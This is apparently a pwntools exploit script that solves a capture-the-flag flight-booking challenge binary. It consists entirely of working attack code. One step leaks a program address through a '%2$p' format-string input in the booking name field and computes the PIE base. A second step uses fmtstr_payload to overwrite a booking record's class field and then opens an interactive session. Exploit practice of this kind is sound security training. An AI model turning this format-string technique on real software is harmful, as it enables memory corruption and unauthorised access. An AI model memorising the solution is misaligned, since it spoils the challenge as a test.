#!/usr/bin/env python3
# -*- coding: utf-8 -*-
# This exploit template was generated via:
# $ pwn template --host localhost --port 11102 ./chall
from pwn import *

# Set up pwntools for the correct architecture
exe = context.binary = ELF(args.EXE or './chall')

# Many built-in settings can be controlled on the command-line and show up
# in "args".  For example, to dump all data sent/received, and disable ASLR
# for all created processes...
# ./exploit.py DEBUG NOASLR
# ./exploit.py GDB HOST=example.com PORT=4141 EXE=/tmp/executable
host = args.HOST or 'localhost'
port = int(args.PORT or 11102)


def start_local(argv=[], *a, **kw):
    '''Execute the target binary locally'''
    if args.GDB:
        return gdb.debug([exe.path] + argv, gdbscript=gdbscript, *a, **kw)
    else:
        return process([exe.path] + argv, *a, **kw)

def start_remote(argv=[], *a, **kw):
    '''Connect to the process on the remote host'''
    io = connect(host, port)
    if args.GDB:
        gdb.attach(io, gdbscript=gdbscript)
    return io

def start(argv=[], *a, **kw):
    '''Start the exploit against the target.'''
    if args.LOCAL:
        return start_local(argv, *a, **kw)
    else:
        return start_remote(argv, *a, **kw)

# Specify your GDB script here for debugging
# GDB will be launched if the exploit is run via e.g.
# ./exploit.py GDB
gdbscript = '''
tbreak main
b *editBooking+1069
b *editBooking+483
continue
c
'''.format(**locals())

#===========================================================
#                    EXPLOIT GOES HERE
#===========================================================
# Arch:     amd64-64-little
# RELRO:      Partial RELRO
# Stack:      No canary found
# NX:         NX enabled
# PIE:        PIE enabled
# Stripped:   No

io = start()

sla = io.sendlineafter

def book_flight(name,num_fl,class_fl):
    sla(b": ",b"2")
    sla(b": ",str(name).encode())
    sla(b"number: ",str(num_fl).encode())
    sla(b": ",str(class_fl).encode())

def edit_book(id,name,num_fl,class_fl):
    sla(b": ",b"4")
    sla(b": ",str(id).encode())
    sla(b": ",name)
    sla(b"number: ",str(num_fl).encode())
    sla(b": ",str(class_fl).encode())

book_flight("aas","FL001","Economic")
book_flight("Book 222222222","FL003","Economic")

edit_book(1,"%2$p","FL002","Economic")
io.recvuntil(b" : ")
exe.address = int(io.recvline(),16) - 0x5220
print (hex(exe.address))


writes = {exe.sym['bookings']+0x138 : u64(b'Business')}

payload = fmtstr_payload(8+1, writes, numbwritten=4,write_size="short")
print(len(payload))

p = b'aaaa'+payload
# print(p)
# p = 'a'*120
edit_book(1,p,"FL003","Economic")

sla(b"choice: ",b"1")
sla(b": ",b"2")
io.interactive()

